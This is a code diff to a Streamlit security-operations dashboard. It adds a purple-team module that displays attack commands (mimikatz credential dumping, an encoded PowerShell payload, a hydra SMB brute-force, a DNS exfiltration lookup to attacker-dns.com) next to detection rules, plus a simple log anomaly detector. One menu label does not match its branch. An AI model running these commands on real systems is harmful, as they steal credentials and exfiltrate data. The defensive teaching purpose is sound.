@@ -1,4 +1,4 @@
-# main_dashboard.py - MHZALY Enterprise SOC & Threat Hunting Platform (Cyberpunk Hacker Edition)
+# main_dashboard.py - MHZALY Enterprise SOC & Threat Hunting Platform (Purple Team Edition)
 
 import streamlit as st
 import pandas as pd
@@ -66,7 +66,7 @@ class SOCDashboardUI:
 
     def __init__(self):
         self.app_name = "MHZALY Enterprise SOC & Threat Hunting Platform"
-        self.version = "10.0 Hacker Edition"
+        self.version = "11.0 Purple Team Edition"
         
         # Initialize Engines safely
         self.processor = ThreatIntelProcessor()
@@ -82,7 +82,7 @@ class SOCDashboardUI:
         st.set_page_config(page_title=self.app_name, layout="wide", page_icon="🛡️")
         
         # ==========================================
-        # ADVANCED ETHICAL HACKER THEME & CRT CSS
+        # ADVANCED ETHICAL HACKER & PURPLE TEAM THEME
         # ==========================================
         st.markdown("""
         <style>
@@ -143,9 +143,9 @@ class SOCDashboardUI:
         }
         
         h1, h2, h3, h4, h5, h6 {
-            color: #00e5ff !important;
+            color: #bd00ff !important;
             font-family: 'Share Tech Mono', monospace !important;
-            text-shadow: 0 0 5px rgba(0,229,255,0.4);
+            text-shadow: 0 0 5px rgba(189,0,255,0.4);
         }
         
         [data-testid="stMetricValue"] {
@@ -164,20 +164,22 @@ class SOCDashboardUI:
 
         .stAlert {
             background-color: #0a0f0d !important;
-            border: 1px solid #00ff66 !important;
+            border: 1px solid #bd00ff !important;
             color: #00ff66 !important;
         }
         </style>
         """, unsafe_allow_html=True)
 
     def render_sidebar(self):
-        st.sidebar.markdown(f"<h2 style='color:#00ff66 !important; text-align:center;'>🛡️ SOC Command Center</h2>", unsafe_allow_html=True)
+        st.sidebar.markdown(f"<h2 style='color:#bd00ff !important; text-align:center;'>🟣 Purple SOC Center</h2>", unsafe_allow_html=True)
         st.sidebar.markdown(f"<p style='text-align:center; color:#8b949e !important;'>Version: {self.version}</p>", unsafe_allow_html=True)
         st.sidebar.markdown("---")
         return st.sidebar.radio("Navigation Menu", [
             "Overview & Dashboard",
             "Global Threat Intel (VirusTotal)", 
             "AlienVault OTX Live Threat Feed", 
+            "Purple Team Attack Simulation & Detection",  # <--- New Purple Team Module
+            "Blue Team Log Anomaly Detector",         # <--- New Blue Team Module
             "Deep Bug Bounty & Vulnerability Scanner", 
             "OSINT & Google Dork Reconnaissance",  
             "Crypto & Password Analyzer",  
@@ -190,15 +192,15 @@ class SOCDashboardUI:
         ])
 
     def run_overview(self):
-        st.title("🛡️ MHZALY Enterprise Cyber Defense Platform")
+        st.title("🟣 MHZALY Enterprise Purple Team Defense Platform")
         st.markdown("---")
-        st.info("🟢 SYSTEM ONLINE | SECURITY PROTOCOLS ACTIVE | MODULES LOADED")
+        st.info("🟢 SYSTEM ONLINE | ATTACK-DEFENSE VALIDATION PIPELINE ACTIVE")
         
         col1, col2, col3, col4 = st.columns(4)
         with col1:
-            st.metric("Active Modules", "11 Core Engines", "Fully Integrated")
+            st.metric("Active Modules", "13 Core Engines", "Fully Integrated")
         with col2:
-            st.metric("SOC Status", "Online", "Protected")
+            st.metric("SOC Status", "Online / Alert", "Purple Active")
         with col3:
             st.metric("Platform Version", self.version, "Stable")
         with col4:
@@ -274,6 +276,88 @@ class SOCDashboardUI:
                                 st.markdown(f"- [{ref}]({ref})")
             else:
                 st.warning("Please enter a target to query.")
+
+    def run_purple_team_simulator(self):
+        st.title("🟣 Purple Team: Attack Simulation & Detection Validation")
+        st.markdown("Simulate common adversary techniques (MITRE ATT&CK) and verify if your defensive controls catch them.")
+        
+        attack_tactic = st.selectbox("Select Attack Simulation Tactic", [
+            "Credential Dumping (LSASS Access)",
+            "PowerShell Obfuscated Execution",
+            "Lateral Movement (SMB/RDP Brute Force)",
+            "Exfiltration via DNS Tunneling"
+        ])
+        
+        if attack_tactic == "Credential Dumping (LSASS Access)":
+            st.warning("🔴 Red Team Action: Simulating process access to lsass.exe (T1003.001)")
+            st.code("mimikatz # sekurlsa::logonpasswords", language="powershell")
+            st.markdown("---")
+            st.success("🔵 Blue Team Validation Rule:")
+            st.markdown("Ensure Sysmon Event ID 10 (ProcessAccess) or EDR behavioral rules trigger an alert when unprivileged handles request PROCESS_VM_READ on lsass.exe.")
+            
+        elif attack_tactic == "PowerShell Obfuscation":
+            st.warning("🔴 Red Team Action: Executing encoded payload (T1027 / T1059.001)")
+            st.code("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEOWN...", language="powershell")
+            st.markdown("---")
+            st.success("🔵 Blue Team Validation Rule:")
+            st.markdown("Check if PowerShell Script Block Logging (Event ID 4104) is enabled and logs base64 decoding attempts.")
+            
+        elif attack_tactic == "Lateral Movement (SMB/RDP Brute Force)":
+            st.warning("🔴 Red Team Action: Rapid authentication attempts against port 445/3389 (T1110)")
+            st.code("hydra -l Administrator -P passwords.txt 192.168.1.100 smb", language="bash")
+            st.markdown("---")
+            st.success("🔵 Blue Team Validation Rule:")
+            st.markdown("Verify Windows Security Event ID 4625 (Failed Logon) threshold alerts and Account Lockout Policy.")
+            
+        else:
+            st.warning("🔴 Red Team Action: Encoding sensitive files into DNS queries (T1048.003)")
+            st.code("nslookup secretdata.attacker-dns.com", language="bash")
+            st.markdown("---")
+            st.success("🔵 Blue Team Validation Rule:")
+            st.markdown("Monitor internal DNS server query volume for abnormally long subdomains or high frequency requests to single external domains.")
+
+    def run_blue_team_log_analyzer(self):
+        st.title("🛡️ Blue Team SIEM & Log Anomaly Detector")
+        st.markdown("Analyze raw server or security logs to instantly spot brute-force attempts and anomalies.")
+        
+        raw_logs = st.text_area("Paste Raw Server / Firewall / Auth Logs Here:", placeholder="Failed password for root from 192.168.1.50 port 22...\nAccepted publickey for admin from 10.0.0.1...")
+        
+        if st.button("Analyze Logs for Anomalies"):
+            if raw_logs:
+                with st.spinner("Parsing logs and running heuristic detection..."):
+                    lines = raw_logs.strip().split("\n")
+                    total_lines = len(lines)
+                    
+                    failed_logins = 0
+                    suspicious_ips = []
+                    success_logins = 0
+                    
+                    for line in lines:
+                        lower_line = line.lower()
+                        if "fail" in lower_line or "invalid" in lower_line or "error" in lower_line:
+                            failed_logins += 1
+                            match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line)
+                            if match:
+                                suspicious_ips.append(match.group())
+                        elif "accepted" in lower_line or "success" in lower_line or "logged in" in lower_line:
+                            success_logins += 1
+                            
+                    st.success("Log Heuristic Analysis Complete!")
+                    
+                    c1, c2, c3 = st.columns(3)
+                    c1.metric("Total Log Entries", total_lines)
+                    c2.error(f"🚨 Failed / Auth Errors: {failed_logins}")
+                    c3.success(f"✅ Successful Sessions: {success_logins}")
+                    
+                    if suspicious_ips:
+                        st.markdown("### ⚠️ Potential Attacker IPs Detected:")
+                        unique_ips = list(set(suspicious_ips))
+                        st.write(unique_ips)
+                        st.info("💡 Recommendation: Check these IPs against VirusTotal or OTX and apply firewall blocks.")
+                    else:
+                        st.info("✨ No obvious brute-force patterns detected in the provided snippet.")
+            else:
+                st.warning("Please paste some log data to analyze.")
 
     def run_bug_bounty_scanner(self):
         st.title("🔍 Deep Bug Bounty & Security Header Analyzer")
@@ -380,6 +464,10 @@ if __name__ == "__main__":
         app.run_threat_intel()
     elif choice == "AlienVault OTX Live Threat Feed":
         app.run_otx_threat_feed()
+    elif choice == "Purple Team Attack Simulation & Detection":
+        app.run_purple_team_simulator()
+    elif choice == "Blue Team Log Anomaly Detector":
+        app.run_blue_team_log_analyzer()
     elif choice == "Deep Bug Bounty & Vulnerability Scanner":
         app.run_bug_bounty_scanner()
     elif choice == "OSINT & Google Dork Reconnaissance":
